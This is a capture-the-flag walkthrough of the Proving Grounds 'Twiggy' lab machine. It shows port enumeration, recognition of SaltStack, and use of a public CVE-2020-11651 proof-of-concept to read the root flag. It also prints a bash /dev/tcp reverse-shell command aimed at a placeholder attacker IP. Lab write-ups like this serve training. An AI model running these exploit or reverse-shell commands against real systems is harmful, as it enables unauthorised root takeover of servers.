# Twiggy  (Proving Grounds Practice · Linux · Easy)

- **IP:** 192.168.134.62   **Date:** 2026-10-08   **Time to root:** fast (recognition → PoC)
- **One-line:** Spotted SaltStack by its 4505/4506 ZeroMQ ports → unauth RCE (CVE-2020-11651) → salt-master runs as **root** → read the flag directly.

---

## 1. Enumeration

**All-ports scan:**
```bash
nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
# open: 22, 53, 80, 4505, 4506, 8000
nmap -p22,53,80,4505,4506,8000 -sCV -Pn -oN scans/services.txt $IP
```
**What each port was:**
| Port | Service | Note |
|---|---|---|
| 22 | OpenSSH 7.4 | payoff only |
| 53 | NSD (DNS) | not the path |
| 80 | nginx 1.16.1 — **Mezzanine** CMS | 🐇 distraction |
| **4505 / 4506** | **ZeroMQ ZMTP 2.0** | 🎯 **SaltStack salt-master** |
| 8000 | nginx, returns JSON | **salt-api** (2nd door to the same bug) |

**🔑 The tell:** `4505 + 4506` open together = **SaltStack**. That pair is a dead giveaway — jump straight to it, ignore the CMS.

## 2. Foothold = Root (salt-master runs as root)

There was no separate user→root step: **the salt-master process runs as root**, so unauth RCE on it *is* root.

**Vector:** CVE-2020-11651 (auth bypass) + CVE-2020-11652 (path traversal) → unauthenticated RCE. Vulnerable on Salt < 2019.2.4 / < 3000.2.

**Steps + commands:**
```bash
# get + read the PoC
git clone https://github.com/jasperla/CVE-2020-11651-poc && cd CVE-2020-11651-poc
# it needs the salt python lib (Kali dropped salt-common from apt → use pip):
pip3 install salt msgpack --break-system-packages

export IP=192.168.134.62

# confirm vulnerable + prove exec (blind):
python3 exploit.py --master $IP --exec "id"
#   → "Checking if vulnerable to CVE-2020-11651... YES"
#   → "root key obtained: ..."
#   → "Successfully scheduled job" (ran, but --exec shows NO output = blind)

# read the flag directly as root (the winning move):
python3 exploit.py --master $IP --read /root/proof.txt      # → proof.txt 🏁
```
- **proof.txt:** `[captured]`

**For a full interactive root shell (optional):**
```bash
# Kali: nc -lvnp 443
python3 exploit.py --master $IP --exec "bash -c 'bash -i >& /dev/tcp/<KALI-IP>/443 0>&1'"
# then: find / -name local.txt 2>/dev/null ; cat /root/proof.txt
```

## 3. Learnings & tips
- **Port recognition wins boxes.** `4505/4506 (ZeroMQ)` → SaltStack, instantly. Memorise service-by-port tells.
- **Ask "what user does the service run as?"** salt-master = root, so the exploit IS the privesc. No local enum needed.
- **Blind RCE → route output to yourself.** `--exec "id"` ran but printed nothing (blind). Don't fight it — use the file-**read** primitive (`--read`) or fire a **reverse shell**.
- **Kali deps on modern Kali:** `apt` no longer has `salt-common`; use `pip3 install salt msgpack --break-system-packages` (or a venv).

## 4. Rabbit holes / mistakes
- ⚠️ **Mezzanine CMS on :80** is a distraction — don't enumerate it; the Salt port is the obvious, faster path.
- ⚠️ **Shell variable `$IP` not set in the new tab** → `--master $IP` gave "expected one argument". Variables are per-tab; `export IP=...` in each tab.
- ⚠️ **Reverse-shell IP = the TARGET by mistake** (`/dev/tcp/192.168.134.62/...`). It must be **your Kali** `tun0` IP. Target = where you attack; Kali = where the shell comes home.

## 5. KB tags used
- `[ENUM-SALTSTACK]` · `[PORT-PLAYBOOK]` · `[ENUM-UNUSUAL-PORTS]` · `[EXPLOIT-RESEARCH]` · `[SHELL-QUICK]` (reverse shell) · `[REVERSE-SHELL-NOT-CONNECTING]` (the Kali-vs-target fix)
